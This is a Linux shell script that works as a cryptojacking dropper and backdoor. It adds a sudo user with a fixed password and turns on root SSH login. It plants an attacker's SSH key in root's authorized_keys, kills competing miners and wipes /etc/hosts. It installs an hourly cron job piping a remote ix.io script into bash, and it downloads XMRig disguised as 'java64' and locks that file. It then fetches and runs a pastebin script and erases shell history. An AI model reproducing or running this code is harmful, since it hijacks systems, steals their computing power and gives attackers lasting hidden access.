#!/bin/sh
useradd -m -p '$1$EuTlnGKV$I6ULVhrfUCnEpFqLGFVHY0' darmok;
usermod -aG sudoers darmok;
usermod -aG darmok;
usermod -aG root darmok;
adduser darmok sudo;
echo "darmok    ALL=(ALL)       ALL" >> /etc/sudoers
sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config;
/etc/init.d/ssh restart;
/etc/init.d/sshd restart;
/etc/rc.d/sshd restart;
service ssh restart;
service sshd restart;
scw-fetch-ssh-keys --upgrade;
sysctl -p;
echo "" > /etc/hosts
mkdir /root/.ssh/;
cat /root/.ssh/authorized_keys |grep -w "admin@localhost" |grep -v grep
if [ $? -eq 0 ]
then
pwd
else
chmod 700 /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDi5nr/787EzPgUWvMYHJMeNW7FpuKaZwiZUWpCQH6mUzdf52nxx42BQXkWxeMf3ehl90+IsWX4XgXWdajS3gh9u09wi/uIbsikHerN11DSWHxi2qF67YH5dfOSHuSsGdFvEEsn5h574CyIrSdDCx5CkZPzu0t87dIj00aJTldRyAaWqtRRHnXg4wHAvc4R1GsAZLoODuv96H9IdDVUxidi7h36xlA2g11p7oY8bGcKIe98Vnok/5/qoMVs/64FsEU70rINXS26Z+2V05UdKxei33TP87UTKPX58mKNhMsRx8LUrpkuHjPU9f/V9LCLZpyCrB6WVgBsKiBfzK69H0kusOBgevG2gjSEIWE+sI9WRHN7iPtw4EcC/ZRzFbNx2p6BuL4jO4MpQzETzW5V0hfCrKmujtCHoYPu1TxKFENOJ3ZwOs0gQ42s2UB/L4CjJOiAmFSb+dkq28UJLDDWlkOatc7TZ/fNH8TAKL/t/k6ohj/lflEMrgErsXckFZbuz6L90k7QyWrv7hGIjZQLu9TYW+FHH/bQK0NDwXRsJRdl/Nucq1X4UNfud4GoZKb0Xmo7r829hxhBsBUHliZItsV9paNJbfSzbV8/rVVerMp89LheoWNIZVb87THCo0Z+rUfOtT87b3aXCrKzTjZNwc2Sf3QW+Pd+4v1NqrrCD79mYQ== admin@localhost" >> /root/.ssh/authorized_keys
sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config;
chmod 600 /root/.ssh/authorized_keys
/etc/init.d/ssh restart;
/etc/init.d/sshd restart;
/etc/rc.d/sshd restart;
service ssh restart;
service sshd restart;
scw-fetch-ssh-keys --upgrade;
sysctl -p;
fi
sed -i 's/#Port 22/Port 22/g' /etc/ssh/sshd_config
/etc/init.d/ssh restart;
/etc/init.d/sshd restart;
/etc/rc.d/sshd restart;
service ssh restart;
service sshd restart;
scw-fetch-ssh-keys --upgrade;
chattr -i /etc/cron.d/2m
chattr -i /etc/cron.d/1m
chattr -i /var/tmp/java/java64
chattr -i /tmp/*
mkdir /tmp
echo "" > /etc/cron.d/2m
echo "" > /etc/cron.d/1m
chattr -i $HOME/moneroocean/config.json
systemctl stop moneroocean_miner.service;
systemctl disable moneroocean_miner.service;
rm -rf /root/moneroocean;
ps -ef | grep nullcrew | grep -v grep | awk '{print $2}' | xargs -r kill -9
ps -ef | grep kworker_ | grep -v grep | awk '{print $2}' | xargs -r kill -9
ps -ef | grep darwin | grep -v grep | awk '{print $2}' | xargs -r kill -9
ps -ef | grep mdad | grep -v grep | awk '{print $2}' | xargs -r kill -9
ps -ef | grep tor | grep -v grep | awk '{print $2}' | xargs -r kill -9
ps -ef | grep main | grep -v grep | awk '{print $2}' | xargs -r kill -9
ps -ef | grep udevs | grep -v grep | awk '{print $2}' | xargs kill -9
skill -KILL udevs
skill -KILL kworkers
rm -rf /var/lib/apt/lists/*
ps aux | grep -vw java64 | awk '{if($3>40.0) print $2}' > /tmp/proc && while read procid; do kill -9 $procid; done < /tmp/proc
ps -fe |grep -w java64 |grep -v grep
if [ $? -eq 0 ]
then
pwd
else
rm -rf /var/tmp/java/java64
crontab -r || true && \
echo "0 * * * * curl -s -L http://ix.io/1K8E | bash -s" >> /tmp/cron || true && \
crontab /tmp/cron || true && \
rm -rf /tmp/cron || true && \
LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`;
LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`;
curl -L $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz;
mkdir -p /var/tmp/java;
tar xf /tmp/xmrig.tar.gz --strip-components=1 -C /var/tmp/java;
rm /tmp/xmrig.tar.gz;
mv /var/tmp/java/xmrig /var/tmp/java/java64;
chmod 777 /var/tmp/java/java64;
cd /var/tmp/java
curl -s -L http://ix.io/1K90 > /var/tmp/java/config.json;
/sbin/sysctl -w vm.nr_hugepages=1000
ps aux | grep -vw java64 | awk '{if($3>40.0) print $2}' > /tmp/proc && while read procid; do kill -9 $procid; done < /tmp/proc
ps -ef | grep tor | grep -v grep | awk '{print $2}' | xargs -r kill -9;
ps -ef | grep main | grep -v grep | awk '{print $2}' | xargs -r kill -9;
nohup /var/tmp/java/java64 -c config.json >/dev/null &
chattr +i /var/tmp/java/java64
fi
ps -fe | grep -w X7QZNkji | grep -v grep
if [ $? -eq 0 ]
then
pwd
else
curl -s https://pastebin.com/raw/X7QZNkji -o ~/X7QZNkji;chmod 777 ~/X7QZNkji;python ~/X7QZNkji start --port=7081 --log=false;
fi
sleep 3
rm -rf /tmp/log.jpg
rm -rf /tmp/nullcrew
echo "runing....."
history -c;
rm -rf /root/.bash_history;
clear;
